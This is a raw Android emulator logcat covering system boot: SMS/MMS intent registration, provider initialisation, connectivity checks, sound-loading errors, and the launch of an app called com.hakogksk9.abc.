I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  601): GC_CONCURRENT freed 354K, 14% free 3364K/3876K, paused 10ms+2ms, total 45ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  355): GC_CONCURRENT freed 2031K, 56% free 5601K/12520K, paused 25ms+5ms, total 105ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/ExternalStorage(  903): Missing UUID for /storage/sdcard; skipping
D/ExternalStorage(  903): After updating volumes, found 0 active roots
D/ExternalStorage(  903): Missing UUID for /storage/sdcard; skipping
D/ExternalStorage(  903): After updating volumes, found 0 active roots
I/ActivityManager(  355): Start proc com.android.email for content provider com.android.email/.provider.EmailProvider: pid=916 uid=10024 gids={50024, 3003, 1028, 1015}
D/MediaScannerReceiver(  624): action: android.intent.action.MEDIA_MOUNTED path: /storage/sdcard
E/BluetoothAdapter(  607): Bluetooth binder is null
I/ActivityManager(  355): Start proc com.android.music for broadcast com.android.music/.MediaButtonIntentReceiver: pid=930 uid=10032 gids={50032, 3003, 1028, 1015}
I/dalvikvm(  930): CheckJNI enabled: not enabling JNI app bug workarounds.
D/ActivityThread(  916): Loading provider com.android.email.provider;com.android.email.notifier: com.android.email.provider.EmailProvider
D/dalvikvm(  355): GC_EXPLICIT freed 436K, 55% free 5708K/12520K, paused 5ms+83ms, total 1096ms
D/AndroidRuntime(  794): Shutting down VM
D/dalvikvm(  794): GC_CONCURRENT freed 95K, 16% free 560K/660K, paused 2ms+3ms, total 23ms
W/RecognitionManagerService(  355): no available voice recognition services found for user 0
V/MediaScanner(  624): pruneDeadThumbnailFiles... android.database.sqlite.SQLiteCursor@b2cefe70
V/MediaScanner(  624): /pruneDeadThumbnailFiles... android.database.sqlite.SQLiteCursor@b2cefe70
D/dalvikvm(  916): GC_CONCURRENT freed 213K, 10% free 2891K/3184K, paused 3ms+1ms, total 51ms
E/logwrapper(  948): executing /system/bin/ip failed: No such file or directory
E/ConnectivityService(  355): Exception trying to add a route: java.lang.IllegalStateException: command '49 interface fwmark exempt add 10.0.2.2/32' failed with '400 49 Failed to add exemption rule (File exists)'
E/logwrapper(  949): executing /system/bin/ip failed: No such file or directory
E/ConnectivityService(  355): Exception trying to add a route: java.lang.IllegalStateException: command '51 interface fwmark exempt add 172.217.23.14/32' failed with '400 51 Failed to add exemption rule (File exists)'
D/ConnectivityService(  355): requestRouteToHostAddress ok=false
D/ConnectivityService(  355): [CheckMp] isMobileOk: could not establish route to hostAddr=clients3.google.com/172.217.23.14
W/ActivityManager(  355): Unable to start service Intent { cmp=com.android.email/.service.AttachmentDownloadService } U=0: not found
I/MediaFocusControl(  355):   Remote Control   registerMediaButtonIntent() for PendingIntent{b31ab038: PendingIntentRecord{b31aafb8 com.android.music broadcastIntent}}
E/BluetoothAdapter(  607): Bluetooth binder is null
I/Email   (  916): Observing account changes for notifications
I/ActivityManager(  355): Start proc com.android.calendar for broadcast com.android.calendar/.widget.CalendarAppWidgetService$CalendarFactory: pid=954 uid=10016 gids={50016, 3003}
W/ActivityManager(  355): Unable to start service Intent { cmp=com.android.email/.service.AttachmentDownloadService } U=0: not found
D/ExtensionsFactory(  954): No custom extensions.
I/ActivityManager(  355): Start proc com.android.providers.calendar for content provider com.android.providers.calendar/.CalendarProvider2: pid=972 uid=10001 gids={50001, 3003, 1028, 1015}
I/ContactDirectoryManager(  547): deleted 0 stale rows which don't have any relevant directory
I/ActivityManager(  355): Start proc com.android.deskclock for broadcast com.android.deskclock/.AlarmInitReceiver: pid=982 uid=10020 gids={50020, 1028}
D/dalvikvm(   59): GC_EXPLICIT freed 40K, 5% free 2705K/2824K, paused 14ms+3ms, total 59ms
D/dalvikvm(   59): GC_EXPLICIT freed <1K, 5% free 2705K/2824K, paused 12ms+2ms, total 53ms
D/dalvikvm(   59): GC_EXPLICIT freed <1K, 5% free 2705K/2824K, paused 2ms+2ms, total 43ms
I/ContactDirectoryManager(  547): Discovered 0 contact directories in 9553ms
I/ContactsProvider(  547): Upgrading aggregation algorithm
I/CalendarDatabaseHelper(  972): Bootstrapping database
I/ContactAggregator(  547): Marked all visible contacts for aggregation: 0 raw contacts, 15 ms
I/ContactsProvider(  547): Aggregation algorithm upgraded for 0 raw contacts in 32ms
I/CalendarProvider2(  972): Created com.android.providers.calendar.CalendarAlarmManager@b2ccab80(com.android.providers.calendar.CalendarProvider2@b2cb7258)
D/dalvikvm(  547): GC_CONCURRENT freed 260K, 10% free 3083K/3420K, paused 19ms+2ms, total 43ms
I/ContactsFTS(  547): Rebuild contact search index in 385ms, 0 contacts
V/AlarmClock(  982): AlarmInitReceiver android.intent.action.TIMEZONE_CHANGED
I/AlarmClock(  982): Alarms Table created
I/AlarmClock(  982): Instance table created
I/AlarmClock(  982): Cities table created
I/AlarmClock(  982): Inserting default alarms
I/AlarmClock(  982): Displaying next alarm time: ''
W/BackupManagerService(  355): dataChanged but no participant pkg='com.android.providers.settings' uid=10020
V/AlarmClock(  982): AlarmInitReceiver finished
E/BluetoothAdapter(  607): Bluetooth binder is null
I/ActivityManager(  355): Start proc com.android.dialer for broadcast com.android.dialer/.calllog.CallLogReceiver: pid=1001 uid=10004 gids={50004, 3003, 1028, 1015}
D/ExtensionsFactory( 1001): No custom extensions.
I/ActivityManager(  355): Delay finish: com.android.dialer/.calllog.CallLogReceiver
I/CalendarProvider2(  972): Sending notification intent: Intent { act=android.intent.action.PROVIDER_CHANGED dat=content://com.android.calendar }
W/ContentResolver(  972): Failed to get type for: content://com.android.calendar (Unknown URL content://com.android.calendar)
I/ActivityManager(  355): Resuming delayed broadcast
E/BluetoothAdapter(  355): Bluetooth binder is null
E/BluetoothAdapter(  355): Bluetooth binder is null
V/WiredAccessoryManager(  355): init()
I/PowerManagerService(  355): Boot animation finished.
E/SoundPool(  355): error loading /system/media/audio/ui/Effect_Tick.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/Effect_Tick.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/Effect_Tick.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/Effect_Tick.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/Effect_Tick.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/Effect_Tick.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/Effect_Tick.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/Effect_Tick.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/Effect_Tick.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/Effect_Tick.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/KeypressStandard.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/KeypressStandard.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/KeypressSpacebar.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/KeypressSpacebar.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/KeypressDelete.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/KeypressDelete.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/KeypressReturn.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/KeypressReturn.ogg
E/SoundPool(  355): error loading /system/media/audio/ui/KeypressInvalid.ogg
W/AudioService(  355): Soundpool could not load file: /system/media/audio/ui/KeypressInvalid.ogg
W/AudioService(  355): onLoadSoundEffects(), Error -1 while loading samples
I/RecoverySystem(  355): No recovery log file
I/BootReceiver(  355): Copying audit failures to DropBox
I/BootReceiver(  355): Checking for fsck errors
D/dalvikvm(  355): GC_CONCURRENT freed 485K, 54% free 5872K/12520K, paused 11ms+4ms, total 64ms
I/ActivityManager(  355): Delay finish: com.android.providers.media/.MediaScannerReceiver
D/ConnectivityService(  355): [CheckMp] isMobileOk: too many loops tried - giving up
D/ConnectivityService(  355): [CheckMp] isMobileOk: X loops|timed out result=0
D/ConnectivityService(  355): [CheckMp] isMobileOk: F stop hipri
D/MobileDataStateTracker(  355): default: setEnableFailFastMobileData(enabled=0)
D/ConnectivityService(  355): stopUsingNetworkFeature: teardown net 0: enableHIPRI
D/MobileDataStateTracker(  355): hipri: Broadcast received: android.intent.action.ANY_DATA_STATE apnType=hipri
D/MobileDataStateTracker(  355): hipri: Received state=DISCONNECTED, old=CONNECTED, reason=dataDisabled
D/MobileDataStateTracker(  355): hipri: setDetailed state, old =CONNECTED and new state=DISCONNECTED
D/ConnectivityService(  355): ConnectivityChange for mobile_hipri: DISCONNECTED/DISCONNECTED
E/logwrapper( 1026): executing /system/bin/ip failed: No such file or directory
E/SecondaryTablController(   55): ip route del failed: /system/bin/ip route del 10.0.2.2/32 via 0.0.0.0 dev eth0 table 60
W/FrameworkListener(   55): Handler 'interface' error (No such device)
D/dalvikvm(  601): GC_CONCURRENT freed 465K, 16% free 3294K/3876K, paused 2ms+2ms, total 66ms
E/logwrapper( 1027): executing /system/bin/ip failed: No such file or directory
E/SecondaryTablController(   55): ip route del failed: /system/bin/ip route del 0.0.0.0/0 via 10.0.2.2 dev eth0 table 60
W/FrameworkListener(   55): Handler 'interface' error (No such device)
D/Nat464Xlat(  355): requiresClat: netType=5, hasIPv4Address=true
D/MobileDataStateTracker(  355): default: setPolicyDataEnable(enabled=true)
I/ActivityManager(  355): Resuming delayed broadcast
I/ActivityManager(  355): Start proc com.android.mms for broadcast com.android.mms/.transaction.MmsSystemEventReceiver: pid=1029 uid=10009 gids={50009, 3003, 1028, 1015}
W/ProcessCpuTracker(  355): Skipping unknown process pid 1028
D/CountryDetector(  355): The first listener is added
E/NetdConnector(  355): NDC Command {59 bandwidth removeiquota eth0} took too long (994ms)
V/MmsConfig( 1029): mnc/mcc: 310260
V/MmsConfig( 1029): tag: bool value: enabledMMS - true
V/MmsConfig( 1029): tag: int value: maxMessageSize - 307200
V/MmsConfig( 1029): tag: int value: maxImageHeight - 480
V/MmsConfig( 1029): tag: int value: maxImageWidth - 640
V/MmsConfig( 1029): tag: int value: defaultSMSMessagesPerThread - 10000
V/MmsConfig( 1029): tag: int value: defaultMMSMessagesPerThread - 1000
V/MmsConfig( 1029): tag: int value: minMessageCountPerThread - 10
V/MmsConfig( 1029): tag: int value: maxMessageCountPerThread - 5000
V/MmsConfig( 1029): tag: string value: uaProfUrl - http://www.google.com/oha/rdf/ua-profile-kila.xml
V/MmsConfig( 1029): tag: int value: recipientLimit - -1
V/MmsConfig( 1029): tag: bool value: enableMultipartSMS - true
V/MmsConfig( 1029): tag: int value: smsToMmsTextThreshold - -1
V/MmsConfig( 1029): tag: bool value: enableSlideDuration - true
V/MmsConfig( 1029): tag: int value: maxMessageTextSize - -1
E/NetdConnector(  355): NDC Command {60 bandwidth gettetherstats} took too long (567ms)
I/MediaProvider(  624): Upgrading media database from version 0 to 700, which will destroy all old data
D/dalvikvm(  355): GC_CONCURRENT freed 894K, 55% free 5672K/12520K, paused 6ms+78ms, total 237ms
E/NetdConnector(  355): NDC Command {61 bandwidth setiquota eth0 9223372036854775807} took too long (1680ms)
D/MobileDataStateTracker(  355): default: setPolicyDataEnable(enabled=true)
D/Tethering(  355): MasterInitialState.processMessage what=3
D/Tethering(  355): MasterInitialState.processMessage what=3
D/CaptivePortalTracker(  355): NoActiveNetworkState{ when=-6ms what=1 obj=NetworkInfo: type: mobile_hipri[UMTS], state: DISCONNECTED/DISCONNECTED, reason: dataDisabled, extra: epc.tmobile.com, roaming: false, failover: false, isAvailable: true, isConnectedToProvisioningNetwork: false target=com.android.internal.util.StateMachine$SmHandler }
D/CaptivePortalTracker(  355): NoActiveNetworkState not a wifi connectivity change, ignore
D/CaptivePortalTracker(  355): NoActiveNetworkState{ when=-5ms what=1 obj=NetworkInfo: type: mobile[UMTS], state: CONNECTED/CONNECTED, reason: connected, extra: epc.tmobile.com, roaming: false, failover: false, isAvailable: true, isConnectedToProvisioningNetwork: false target=com.android.internal.util.StateMachine$SmHandler }
D/CaptivePortalTracker(  355): NoActiveNetworkState not a wifi connectivity change, ignore
D/dalvikvm(  355): GC_CONCURRENT freed 643K, 55% free 5690K/12520K, paused 5ms+57ms, total 210ms
E/NetdConnector(  355): NDC Command {62 bandwidth removeiquota eth0} took too long (831ms)
D/dalvikvm(  355): GC_CONCURRENT freed 661K, 55% free 5688K/12520K, paused 15ms+43ms, total 205ms
E/SQLiteLog(  624): (1) no such table: files
D/ConnectivityService(  355): [CheckMp] isMobileOk: X result=0
D/ConnectivityService(  355): [CheckMp] onPostExecute: result=0
D/ConnectivityService(  355): CheckMp.onComplete: result=0
D/ConnectivityService(  355): CheckMp.onComplete: ignore, connected or no connection
E/WVMExtractor(   61): Failed to open libwvm.so
E/NetdConnector(  355): NDC Command {63 bandwidth setiquota eth0 9223372036854775807} took too long (1689ms)
D/MobileDataStateTracker(  355): default: setPolicyDataEnable(enabled=true)
D/MobileDataStateTracker(  355): default: setPolicyDataEnable(enabled=true)
I/ActivityManager(  355): Delay finish: com.android.mms/.transaction.MmsSystemEventReceiver
D/Mms:app ( 1029): cancelNotification
I/ActivityManager(  355): Resuming delayed broadcast
I/ActivityManager(  355): Delay finish: com.android.mms/.transaction.SmsReceiver
D/MmsSmsDatabaseHelper(  601): [MmsSmsDb] tableName: threads hasAutoIncrement: CREATE TABLE threads (_id INTEGER PRIMARY KEY AUTOINCREMENT,date INTEGER DEFAULT 0,message_count INTEGER DEFAULT 0,recipient_ids TEXT,snippet TEXT,snippet_cs INTEGER DEFAULT 0,read INTEGER DEFAULT 1,type INTEGER DEFAULT 0,error INTEGER DEFAULT 0,has_attachment INTEGER DEFAULT 0) result: true
D/MmsSmsDatabaseHelper(  601): [MmsSmsDb] tableName: canonical_addresses hasAutoIncrement: CREATE TABLE canonical_addresses (_id INTEGER PRIMARY KEY AUTOINCREMENT,address TEXT) result: true
D/MmsSmsDatabaseHelper(  601): [MmsSmsDb] tableName: part hasAutoIncrement: CREATE TABLE part (_id INTEGER PRIMARY KEY AUTOINCREMENT,mid INTEGER,seq INTEGER DEFAULT 0,ct TEXT,name TEXT,chset INTEGER,cd TEXT,fn TEXT,cid TEXT,cl TEXT,ctt_s INTEGER,ctt_t TEXT,_data TEXT,text TEXT) result: true
D/MmsSmsDatabaseHelper(  601): [MmsSmsDb] tableName: pdu hasAutoIncrement: CREATE TABLE pdu (_id INTEGER PRIMARY KEY AUTOINCREMENT,thread_id INTEGER,date INTEGER,date_sent INTEGER DEFAULT 0,msg_box INTEGER,read INTEGER DEFAULT 0,m_id TEXT,sub TEXT,sub_cs INTEGER,ct_t TEXT,ct_l TEXT,exp INTEGER,m_cls TEXT,m_type INTEGER,v INTEGER,m_size INTEGER,pri INTEGER,rr INTEGER,rpt_a INTEGER,resp_st INTEGER,st INTEGER,tr_id TEXT,retr_st INTEGER,retr_txt TEXT,retr_txt_cs INTEGER,read_status INTEGER,ct_cls INTEGER,resp_txt TEXT,d_tm INTEGER,d_rpt INTEGER,locked INTEGER DEFAULT 0,seen INTEGER DEFAULT 0,text_only INTEGER DEFAULT 0) result: true
D/MmsSmsDatabaseHelper(  601): [getWritableDatabase] hasAutoIncrementThreads: true hasAutoIncrementAddresses: true hasAutoIncrementPart: true hasAutoIncrementPdu: true
D/Mms:app ( 1029): cancelNotification
I/ActivityManager(  355): Resuming delayed broadcast
D/AlertReceiver(  954): onReceive: a=android.intent.action.BOOT_COMPLETED Intent { act=android.intent.action.BOOT_COMPLETED flg=0x8000010 cmp=com.android.calendar/.alerts.AlertReceiver (has extras) }
D/dalvikvm(  624): GC_CONCURRENT freed 245K, 10% free 3028K/3352K, paused 4ms+9ms, total 97ms
I/ActivityManager(  355): Delay finish: com.android.calendar/.alerts.AlertReceiver
D/AlertUtils(  954): Flushing old alerts from shared prefs table
D/AlertService(  954): 0 Action = android.intent.action.BOOT_COMPLETED
D/AlertService(  954): Scheduling next alarm with AlarmScheduler. sEventReminderReceived: null
D/dalvikvm(  954): GC_CONCURRENT freed 280K, 12% free 2831K/3196K, paused 21ms+4ms, total 55ms
D/AlarmScheduler(  954): No events found starting within 1 week.
V/MediaScanner(  624): pruneDeadThumbnailFiles... android.database.sqlite.SQLiteCursor@b2d0e7e8
V/MediaScanner(  624): /pruneDeadThumbnailFiles... android.database.sqlite.SQLiteCursor@b2d0e7e8
I/ActivityManager(  355): Resuming delayed broadcast
V/AlarmClock(  982): AlarmInitReceiver android.intent.action.BOOT_COMPLETED
E/MetadataRetrieverClient(   61): failed to extract an album art
V/AlarmClock(  982): AlarmInitReceiver - Reset timers and clear stopwatch data
V/AlarmClock(  982): AlarmInitReceiver - resetting volume button default
D/dalvikvm(  982): GC_CONCURRENT freed 398K, 15% free 2807K/3288K, paused 5ms+2ms, total 97ms
D/dalvikvm(  982): WAIT_FOR_CONCURRENT_GC blocked 16ms
I/InputReader(  355): Reconfiguring input devices.  changes=0x00000010
I/InputReader(  355): Reconfiguring input devices.  changes=0x00000010
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/AlarmClock(  982): Displaying next alarm time: ''
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
V/AlarmClock(  982): AlarmInitReceiver finished
D/dalvikvm(  355): GC_CONCURRENT freed 683K, 55% free 5755K/12520K, paused 6ms+5ms, total 146ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 52ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 46ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 47ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 34ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  601): GC_CONCURRENT freed 322K, 13% free 3399K/3876K, paused 3ms+2ms, total 93ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  355): GC_CONCURRENT freed 756K, 55% free 5757K/12520K, paused 17ms+5ms, total 101ms
D/dalvikvm(  355): WAIT_FOR_CONCURRENT_GC blocked 47ms
I/ActivityManager(  355): Delay finish: com.android.email/.service.EmailUpgradeBroadcastReceiver
D/dalvikvm(  601): GC_CONCURRENT freed 493K, 15% free 3357K/3944K, paused 3ms+2ms, total 25ms
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "sms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "smsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mms"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
I/PackageManager(  355):   Action: "android.intent.action.SENDTO"
I/PackageManager(  355):   Category: "android.intent.category.DEFAULT"
I/PackageManager(  355):   Scheme: "mmsto"
I/PackageManager(  355): Adding preferred activity ComponentInfo{com.android.mms/com.android.mms.ui.ComposeMessageActivity} for user 0 :
D/dalvikvm(  601): GC_CONCURRENT freed 484K, 16% free 3321K/3944K, paused 4ms+2ms, total 64ms
D/dalvikvm(  355): GC_CONCURRENT freed 652K, 54% free 5798K/12520K, paused 22ms+17ms, total 137ms
I/ActivityManager(  355): Resuming delayed broadcast
I/ActivityManager(  355): Delay finish: com.android.email/.service.EmailBroadcastReceiver
I/Email   (  916): Onetime initialization: 1
I/Email   (  916): Onetime initialization: 2
I/Email   (  916): Onetime initialization: completed.
I/ActivityManager(  355): Delaying start of: ServiceRecord{b3557f68 u0 com.android.exchange/.service.EmailSyncAdapterService}
I/ActivityManager(  355): Resuming delayed broadcast
I/LauncherIconVisibilityManager(  589): Boot has been completed
I/LauncherIconVisibilityManager(  589): Disable activity: ComponentInfo{com.android.inputmethod.latin/com.android.inputmethod.latin.setup.SetupActivity}
E/BluetoothAdapter(  607): Bluetooth binder is null
I/ActivityManager(  355): Delay finish: com.android.deskclock/com.android.alarmclock.AnalogAppWidgetProvider
D/dalvikvm( 1029): GC_CONCURRENT freed 229K, 10% free 2876K/3188K, paused 41ms+10ms, total 127ms
E/StrictMode( 1029): A resource was acquired at attached stack trace but never released. See java.io.Closeable for information on avoiding resource leaks.
E/StrictMode( 1029): java.lang.Throwable: Explicit termination method 'release' not called
E/StrictMode( 1029): 	at dalvik.system.CloseGuard.open(CloseGuard.java:184)
E/StrictMode( 1029): 	at android.drm.DrmManagerClient.<init>(DrmManagerClient.java:258)
E/StrictMode( 1029): 	at com.google.android.mms.pdu.PduPersister.<init>(PduPersister.java:288)
E/StrictMode( 1029): 	at com.google.android.mms.pdu.PduPersister.getPduPersister(PduPersister.java:296)
E/StrictMode( 1029): 	at com.android.mms.transaction.TransactionService.onNewIntent(TransactionService.java:224)
E/StrictMode( 1029): 	at com.android.mms.transaction.TransactionService$ServiceHandler.handleMessage(TransactionService.java:621)
E/StrictMode( 1029): 	at android.os.Handler.dispatchMessage(Handler.java:102)
E/StrictMode( 1029): 	at android.os.Looper.loop(Looper.java:136)
E/StrictMode( 1029): 	at android.os.HandlerThread.run(HandlerThread.java:61)
I/ActivityManager(  355): Resuming delayed broadcast
W/BroadcastQueue(  355): Permission Denial: broadcasting Intent { act=android.appwidget.action.APPWIDGET_UPDATE_OPTIONS flg=0x10 cmp=com.android.settings/.widget.SettingsAppWidgetProvider (has extras) } from android (pid=675, uid=10008) is not exported from uid 1000 due to receiver com.android.settings/.widget.SettingsAppWidgetProvider
I/ActivityManager(  355): Start proc com.svox.pico for broadcast com.svox.pico/.VoiceDataInstallerReceiver: pid=1121 uid=10037 gids={50037, 1028, 1015}
D/AlertReceiver(  954): onReceive: a=android.intent.action.PROVIDER_CHANGED Intent { act=android.intent.action.PROVIDER_CHANGED dat=content://com.android.calendar flg=0x10 cmp=com.android.calendar/.alerts.AlertReceiver }
I/ActivityManager(  355): Delay finish: com.android.calendar/.alerts.AlertReceiver
D/AlertService(  954): 0 Action = android.intent.action.PROVIDER_CHANGED
I/ActivityManager(  355): Waited long enough for: ServiceRecord{b36103b0 u0 com.android.music/.MediaPlaybackService}
I/ActivityManager(  355): Resuming delayed broadcast
E/BluetoothAdapter(  607): Bluetooth binder is null
I/ActivityManager(  355): Delay finish: com.android.mms/.transaction.SmsReceiver
V/SmsReceiverService( 1029): onStart: #1 mResultCode: -1 = Activity.RESULT_OK
I/ActivityManager(  355): Resuming delayed broadcast
I/ActivityManager(  355): Delay finish: com.android.providers.calendar/.CalendarProviderBroadcastReceiver
D/dalvikvm(  972): GC_CONCURRENT freed 220K, 10% free 2892K/3192K, paused 5ms+2ms, total 93ms
I/ActivityManager(  355): Resuming delayed broadcast
D/MobileDataStateTracker(  355): default: setPolicyDataEnable(enabled=true)
D/ConnectivityService(  355): Sampling interval elapsed, updating statistics ..
D/ConnectivityService(  355): Done.
D/ConnectivityService(  355): Setting timer for 720seconds
I/GlobalDismissManager(  954): no sender configured
D/AlertService(  954): Beginning updateAlertNotification
D/AlertService(  954): No fired or scheduled alerts
D/dalvikvm(  355): GC_CONCURRENT freed 718K, 55% free 5732K/12520K, paused 33ms+5ms, total 110ms
D/AlertService(  954): Scheduling next alarm with AlarmScheduler. sEventReminderReceived: null
D/AlarmScheduler(  954): No events found starting within 1 week.
D/AndroidRuntime( 1144): 
D/AndroidRuntime( 1144): >>>>>> AndroidRuntime START com.android.internal.os.RuntimeInit <<<<<<
D/AndroidRuntime( 1144): CheckJNI is ON
D/dalvikvm( 1144): Trying to load lib libjavacore.so 0x0
D/dalvikvm( 1144): Added shared lib libjavacore.so 0x0
D/dalvikvm( 1144): Trying to load lib libnativehelper.so 0x0
D/dalvikvm( 1144): Added shared lib libnativehelper.so 0x0
D/dalvikvm( 1144): No JNI_OnLoad found in libnativehelper.so 0x0, skipping init
D/dalvikvm( 1144): Note: class Landroid/app/ActivityManagerNative; has 179 unimplemented (abstract) methods
E/memtrack( 1144): Couldn't load memtrack module (No such file or directory)
E/android.os.Debug( 1144): failed to load memtrack module: -2
D/AndroidRuntime( 1144): Calling main entry com.android.commands.am.Am
I/ActivityManager(  355): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10000000 cmp=com.hakogksk9.abc/.MainActivity} from pid 1144
D/gralloc (   58): Registering a buffer in the process that created it. This may cause memory ordering problems.
E/libEGL  (   58): called unimplemented OpenGL ES API
E/libEGL  (   58): called unimplemented OpenGL ES API
E/libEGL  (   58): called unimplemented OpenGL ES API
E/libEGL  (   58): called unimplemented OpenGL ES API
E/SurfaceFlinger(   58): glCheckFramebufferStatusOES error -8956193
E/SurfaceFlinger(   58): got GL_FRAMEBUFFER_COMPLETE_OES error while taking screenshot
E/libEGL  (   58): called unimplemented OpenGL ES API
E/libEGL  (   58): called unimplemented OpenGL ES API
W/WindowManager(  355): Screenshot failure taking screenshot for (164x295) to layer 21005
I/ActivityManager(  355): Start proc com.hakogksk9.abc for activity com.hakogksk9.abc/.MainActivity: pid=1154 uid=10052 gids={50052, 3003, 1028, 1015}
I/Launcher(  675): Deferring update until onResume
I/InputReader(  355): Reconfiguring input devices.  changes=0x00000010
I/InputReader(  355): Reconfiguring input devices.  changes=0x00000010
